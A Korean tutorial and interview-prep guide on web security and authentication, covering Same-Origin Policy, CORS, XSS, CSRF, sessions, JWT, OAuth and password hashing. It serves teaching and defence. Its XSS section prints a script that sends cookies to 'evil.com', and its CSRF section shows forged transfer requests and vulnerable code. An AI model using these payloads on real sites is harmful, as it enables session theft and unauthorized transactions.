# 웹 보안과 인증 Deep Dive

## 왜 웹 보안이 필요한가?

웹 애플리케이션은 본질적으로 **신뢰할 수 없는 클라이언트**와 통신한다. 브라우저에서 오는 모든 요청은 조작될 수 있고, 사용자가 입력한 모든 데이터는 악의적일 수 있다. 서버는 클라이언트를 믿어서는 안 된다.

웹 보안은 크게 두 가지 관점에서 필요하다.

- **공격 방어**: 악의적인 사용자로부터 시스템과 다른 사용자를 보호
- **인증/인가**: 사용자가 누구인지 확인하고, 권한에 맞는 접근만 허용

---

## 동일 출처 정책 (Same-Origin Policy)

웹 보안의 가장 기본적인 원칙이다. 브라우저는 **출처(Origin)**가 다른 리소스에 대한 접근을 제한한다.

### Origin이란?

Origin은 **프로토콜 + 호스트 + 포트**의 조합이다.

```
https://example.com:443/path/page.html
└─┬──┘ └────┬─────┘└┬─┘
프로토콜   호스트   포트

같은 Origin:
https://example.com/other → 같음
https://example.com:443/any → 같음 (443은 HTTPS 기본 포트)

다른 Origin:
http://example.com → 프로토콜 다름
https://api.example.com → 호스트 다름
https://example.com:8080 → 포트 다름
```

### 왜 필요한가?

Same-Origin Policy가 없다면 어떤 일이 벌어질까? 사용자가 악성 사이트 `evil.com`에 접속했을 때, 그 페이지의 JavaScript가 `bank.com`의 API를 호출할 수 있다. 사용자가 `bank.com`에 로그인되어 있다면 쿠키가 자동으로 전송되어 계좌 정보가 탈취될 수 있다.

- 다른 출처의 DOM 접근 차단
- 다른 출처로의 AJAX 요청 차단 (응답 읽기)
- 다른 출처의 쿠키/스토리지 접근 차단

### 허용되는 것들

모든 크로스 오리진 요청이 차단되는 것은 아니다.

- `<script src>`: 다른 출처의 JS 로드 (CDN)
- `<link href>`: 다른 출처의 CSS 로드
- `<img src>`: 다른 출처의 이미지 로드
- `<form action>`: 다른 출처로 폼 제출

하지만 JavaScript로 다른 출처의 **응답 데이터를 읽는 것**은 차단된다.

---

## CORS (Cross-Origin Resource Sharing)

Same-Origin Policy는 보안에 필수적이지만, 현대 웹에서는 다른 출처의 API를 호출해야 하는 경우가 많다. 프론트엔드가 `frontend.com`에 있고 API 서버가 `api.backend.com`에 있다면?

**CORS**는 서버가 명시적으로 허용한 출처에서만 크로스 오리진 요청을 허용하는 메커니즘이다.

### 단순 요청 (Simple Request)

특정 조건을 만족하면 브라우저가 바로 요청을 보내고, 서버 응답의 CORS 헤더를 확인한다.

조건:
- 메서드: GET, HEAD, POST 중 하나
- Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain만

```
GET /api/data HTTP/1.1
Host: api.backend.com
Origin: https://frontend.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://frontend.com
```

`Access-Control-Allow-Origin`이 요청의 Origin과 일치하거나 `*`이면 브라우저가 응답을 JavaScript에 전달한다.

### Preflight 요청

단순 요청 조건을 만족하지 않으면, 브라우저는 실제 요청 전에 **OPTIONS 메서드로 사전 확인**한다.

```
# 1. Preflight 요청
OPTIONS /api/data HTTP/1.1
Host: api.backend.com
Origin: https://frontend.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization

# 2. Preflight 응답
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400

# 3. 실제 요청 (Preflight 통과 후)
PUT /api/data HTTP/1.1
...
```

### 자격 증명 (Credentials)

기본적으로 크로스 오리진 요청에는 쿠키가 포함되지 않는다. 쿠키를 포함하려면 양쪽 설정이 필요하다.

```javascript
// 클라이언트
fetch('https://api.backend.com/data', { credentials: 'include' });
```

```
// 서버 응답
Access-Control-Allow-Origin: https://frontend.com  // *는 불가
Access-Control-Allow-Credentials: true
```

---

## XSS (Cross-Site Scripting)

CORS가 "다른 출처에서 내 데이터를 읽는 것"을 막는다면, XSS는 **내 출처에 악성 스크립트를 삽입**하는 공격이다. 같은 출처이므로 Same-Origin Policy가 적용되지 않는다.

### 공격 원리

사용자 입력이 그대로 HTML에 삽입되면 문제가 발생한다.

```html
<!-- 게시판에 사용자가 작성한 내용 -->
<div class="comment">
  <script>
    fetch('https://evil.com/steal?cookie=' + document.cookie)
  </script>
</div>
```

이 게시글을 다른 사용자가 열람하면, 그 사용자의 브라우저에서 악성 스크립트가 실행된다. 쿠키 탈취, 키로깅, 페이지 변조 등이 가능해진다.

### XSS 유형

**Stored XSS (저장형)**: 악성 스크립트가 서버 DB에 저장되어 다른 사용자가 열람할 때 실행된다. 게시판, 댓글, 프로필 등.

**Reflected XSS (반사형)**: URL 파라미터 등을 통해 전달된 스크립트가 응답에 포함된다.

```
https://example.com/search?q=<script>alert('XSS')</script>
```

**DOM-based XSS**: 서버 응답은 정상이지만, 클라이언트 JavaScript가 안전하지 않게 DOM을 조작한다.

```javascript
// 취약한 코드
document.getElementById('output').innerHTML = location.hash.slice(1);
```

### XSS 방어

**1. 출력 인코딩 (Output Encoding)**

HTML에 삽입할 때 특수 문자를 이스케이프한다.

```
< → &lt;    > → &gt;    & → &amp;    " → &quot;
```

```javascript
// React는 기본적으로 이스케이프
<div>{userInput}</div>  // 안전
<div dangerouslySetInnerHTML={{__html: userInput}} />  // XSS 취약
```

**2. Content Security Policy (CSP)**

브라우저에게 허용된 리소스 출처를 알려준다.

```
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
```

인라인 스크립트 차단, `eval()` 차단.

**3. HttpOnly 쿠키**

JavaScript로 쿠키 접근을 차단한다.

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

XSS가 발생해도 `document.cookie`로 세션 쿠키를 탈취할 수 없다.

---

## CSRF (Cross-Site Request Forgery)

XSS가 "내 사이트에 악성 코드를 삽입"하는 공격이라면, CSRF는 **사용자가 의도하지 않은 요청을 보내게 만드는** 공격이다.

### 공격 원리

사용자가 `bank.com`에 로그인한 상태에서 악성 사이트를 방문한다.

```html
<!-- evil.com의 페이지 -->
<img src="https://bank.com/transfer?to=attacker&amount=1000000" />
```

브라우저가 이미지를 로드하려고 `bank.com`에 GET 요청을 보낸다. 사용자가 `bank.com`에 로그인되어 있으므로 쿠키가 자동 전송된다. 서버는 정상적인 요청으로 판단하고 송금을 처리한다.

POST 요청도 가능하다:

```html
<form id="attack" action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000000" />
</form>
<script>document.getElementById('attack').submit();</script>
```

### CSRF vs XSS

| | XSS | CSRF |
|---|-----|------|
| 공격 위치 | 피해 사이트에 코드 삽입 | 다른 사이트에서 요청 유도 |
| 권한 | 피해 사이트의 모든 권한 | 특정 요청만 가능 |
| Same-Origin | 우회 (같은 출처) | 적용됨 (응답 못 읽음) |

CSRF 공격자는 요청은 보낼 수 있지만, Same-Origin Policy 때문에 **응답은 읽을 수 없다**. 그래서 데이터 조회가 아닌 **상태 변경** 요청을 노린다.

### CSRF 방어

**1. CSRF 토큰**

서버가 폼에 예측 불가능한 토큰을 삽입하고, 요청 시 검증한다.

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="abc123xyz..." />
  <input name="to" />
  <input name="amount" />
</form>
```

공격자는 토큰 값을 알 수 없으므로 유효한 요청을 만들 수 없다.

**2. SameSite 쿠키**

크로스 사이트 요청에 쿠키를 보내지 않도록 설정한다.

```
Set-Cookie: session=abc123; SameSite=Strict
```

- `Strict`: 다른 사이트에서 온 모든 요청에 쿠키 미전송
- `Lax`: GET 요청은 허용, POST 등은 차단 (기본값)

---

## 인증 (Authentication) vs 인가 (Authorization)

보안의 두 축이다. 혼동하기 쉽지만 완전히 다른 개념이다.

- **인증 (AuthN)**: "당신이 누구인가?" - 사용자의 신원을 확인 (로그인)
- **인가 (AuthZ)**: "당신이 무엇을 할 수 있는가?" - 인증된 사용자의 권한을 확인

인증 없이 인가는 불가능하다. 먼저 누구인지 알아야 권한을 확인할 수 있다.

---

## 세션 기반 인증

가장 전통적인 인증 방식이다. 서버가 사용자 상태를 저장한다.

### 동작 과정

```
1. 로그인 요청
Client ──── POST /login {id, pw} ────→ Server
                                       │ DB에서 검증
                                       │ 세션 생성, 세션 저장소에 저장
       ←─── Set-Cookie: session=abc ───┘

2. 이후 요청
Client ──── GET /profile ────────────→ Server
            Cookie: session=abc        │ 세션 저장소에서 조회
       ←─── {name: "홍길동", ...} ─────┘

3. 로그아웃
       세션 저장소에서 삭제, 쿠키 무효화
```

### 세션 저장소

- **메모리**: 가장 빠름, 서버 재시작 시 유실, 스케일 아웃 불가
- **Redis**: 빠름, 스케일 아웃 가능, TTL 지원

### 장단점

장점:
- 서버가 세션을 완전히 제어 (즉시 무효화 가능)
- 클라이언트에 민감 정보 저장 안 함

단점:
- 서버에 상태 저장 (Stateful)
- 수평 확장 시 세션 공유 문제 (Sticky Session 또는 공유 저장소 필요)

여러 서버로 확장할 때 문제가 된다. 사용자가 서버 A에서 로그인했는데 다음 요청이 서버 B로 가면 세션을 찾을 수 없다. 이 문제를 근본적으로 해결하려면 **서버가 상태를 저장하지 않는 방식**이 필요하다.

---

## 토큰 기반 인증 (JWT)

**JWT (JSON Web Token)**는 필요한 정보를 토큰 자체에 담아 클라이언트에게 전달한다. 서버는 상태를 저장하지 않고, 토큰의 서명만 검증한다.

### JWT 구조

```
xxxxx.yyyyy.zzzzz
Header.Payload.Signature
```

**Header**: 토큰 타입과 서명 알고리즘

```json
{ "alg": "HS256", "typ": "JWT" }
```

**Payload**: 클레임 (사용자 정보, 만료 시간 등)

```json
{ "sub": "1234", "name": "홍길동", "role": "user", "exp": 1516242622 }
```

**Signature**: 위변조 방지

```
HMACSHA256(base64(header) + "." + base64(payload), secret)
```

Header와 Payload는 Base64 인코딩일 뿐 **암호화가 아니다**. 민감 정보를 담으면 안 된다.

### 동작 과정

```
1. 로그인
Client ──── POST /login {id, pw} ────→ Server
                                       │ JWT 생성 (서명 포함)
       ←─── {token: "eyJhbG..."} ──────┘

2. 이후 요청
Client ──── GET /profile ────────────→ Server
            Authorization: Bearer eyJhbG...
                                       │ 서명 검증 (DB 조회 없음)
       ←─── {name: "홍길동", ...} ─────┘
```

### 세션 vs JWT

| | 세션 | JWT |
|---|------|-----|
| 상태 저장 | 서버 (Stateful) | 클라이언트 (Stateless) |
| 확장성 | 세션 공유 필요 | 서버 간 공유 불필요 |
| 즉시 무효화 | 가능 | 어려움 |
| 매 요청 | 저장소 조회 | 서명 검증만 |

### JWT의 한계: 토큰 무효화

JWT의 가장 큰 단점은 **발급 후 서버가 제어할 수 없다**는 것이다. 토큰이 탈취되면 만료될 때까지 막을 방법이 없다.

해결책:
- **짧은 만료 시간**: Access Token을 15분 등으로 짧게
- **블랙리스트**: 무효화된 토큰 ID를 저장 (Stateful해짐)

### Access Token + Refresh Token

짧은 만료 시간은 보안에 좋지만, 사용자가 자주 다시 로그인해야 하는 불편함이 있다. 이를 해결하기 위해 두 종류의 토큰을 사용한다.

- **Access Token**: 짧은 수명 (15분~1시간), API 요청에 사용
- **Refresh Token**: 긴 수명 (7일~30일), Access Token 재발급용

```
1. 로그인 → {accessToken, refreshToken}
2. API 요청 → Authorization: Bearer {accessToken}
3. Access Token 만료 → POST /refresh {refreshToken} → 새 accessToken
4. Refresh Token 만료 → 다시 로그인
```

Refresh Token은 HttpOnly 쿠키에 저장하고, Access Token은 메모리에 저장하는 것이 권장된다.

---

## OAuth 2.0

직접 인증을 구현하는 대신, **신뢰할 수 있는 제3자(Google, GitHub 등)**에게 인증을 위임하는 표준 프로토콜이다.

### 왜 OAuth인가?

- 사용자: 기존 계정으로 간편 로그인
- 서비스: 비밀번호를 직접 관리하지 않아도 됨
- 인증 제공자: 사용자 정보 제어권 유지

### OAuth 2.0 흐름 (Authorization Code Grant)

```
1. 사용자가 "Google로 로그인" 클릭
2. Google 인증 페이지로 리다이렉트
3. 사용자가 로그인 + 권한 동의
4. Authorization Code와 함께 Callback URL로 리다이렉트
5. 서버가 code + client_secret으로 Access Token 요청
6. Access Token으로 사용자 정보 조회
7. 로그인 완료, 세션/JWT 발급
```

핵심은 Authorization Code를 브라우저에서 받고, **서버 백엔드에서 client_secret과 함께 Access Token으로 교환**한다는 것이다. Access Token이 브라우저에 노출되지 않는다.

### PKCE (Proof Key for Code Exchange)

모바일 앱이나 SPA처럼 client_secret을 안전하게 저장할 수 없는 환경에서 사용한다.

- code_verifier(랜덤 문자열) 생성
- code_challenge = SHA256(code_verifier)를 인증 요청에 포함
- 토큰 교환 시 code_verifier 전송하여 검증

---

## 비밀번호 저장

### 하면 안 되는 것

**평문 저장**: DB 유출 시 모든 비밀번호 노출

**단순 해시**: `SHA256(password)` - Rainbow Table 공격에 취약, 같은 비밀번호는 같은 해시

### 올바른 방법

**Salt + 느린 해시 함수**

```javascript
const bcrypt = require('bcrypt');

// 저장
const hash = await bcrypt.hash(password, 12);

// 검증
const isValid = await bcrypt.compare(inputPassword, storedHash);
```

- **Salt**: 사용자마다 다른 랜덤 값을 추가하여 Rainbow Table 무력화
- **bcrypt/scrypt/Argon2**: 의도적으로 느린 해시 함수, 무차별 대입 공격 비용 증가
- **Cost Factor**: 연산 비용 조절 (하드웨어 발전에 맞춰 증가)

---

## 면접 예상 질문

**Q. XSS와 CSRF의 차이점을 설명하시오.**

XSS는 공격자가 피해 사이트에 악성 스크립트를 삽입하여 피해 사이트의 권한으로 실행되게 하는 공격이다. Same-Origin Policy를 우회한다. CSRF는 사용자가 의도하지 않은 요청을 다른 사이트에서 보내게 하는 공격이다. 사용자의 인증 쿠키를 이용하지만 응답은 읽을 수 없다. XSS는 출력 인코딩과 CSP로, CSRF는 CSRF 토큰과 SameSite 쿠키로 방어한다.

**Q. 세션 기반과 토큰 기반 인증의 차이점은?**

세션 기반은 서버가 세션 저장소에 상태를 저장하고 클라이언트에는 세션 ID만 전달한다. 서버가 세션을 완전히 제어할 수 있지만, 수평 확장 시 세션 공유가 필요하다. 토큰 기반(JWT)은 필요한 정보를 토큰에 담아 클라이언트에 저장하고 서버는 서명만 검증한다. Stateless라 확장이 쉽지만, 발급된 토큰을 즉시 무효화하기 어렵다.

**Q. JWT를 어디에 저장해야 하나?**

Access Token은 JavaScript 변수(메모리)에 저장하는 것이 가장 안전하다. XSS에도 localStorage보다 접근이 어렵다. Refresh Token은 HttpOnly, Secure, SameSite 쿠키에 저장하여 JavaScript 접근을 차단한다. localStorage는 XSS에 취약하고, 일반 쿠키는 CSRF에 취약하다.

**Q. CORS의 Preflight 요청은 무엇인가?**

브라우저가 실제 요청 전에 OPTIONS 메서드로 서버에 허용 여부를 확인하는 것이다. 단순 요청(GET/POST, 특정 헤더만) 조건을 만족하지 않으면 발생한다. 서버는 Access-Control-Allow-Methods, Access-Control-Allow-Headers 등으로 허용 범위를 응답한다. Preflight 응답은 캐시되어 매 요청마다 발생하지 않는다.

**Q. 비밀번호는 어떻게 저장해야 하나?**

평문이나 단순 해시(SHA256)로 저장하면 안 된다. bcrypt, scrypt, Argon2 같은 느린 해시 함수를 사용하고, 사용자마다 랜덤한 Salt를 추가한다. 느린 해시는 무차별 대입 공격 비용을 높이고, Salt는 Rainbow Table 공격을 무력화한다.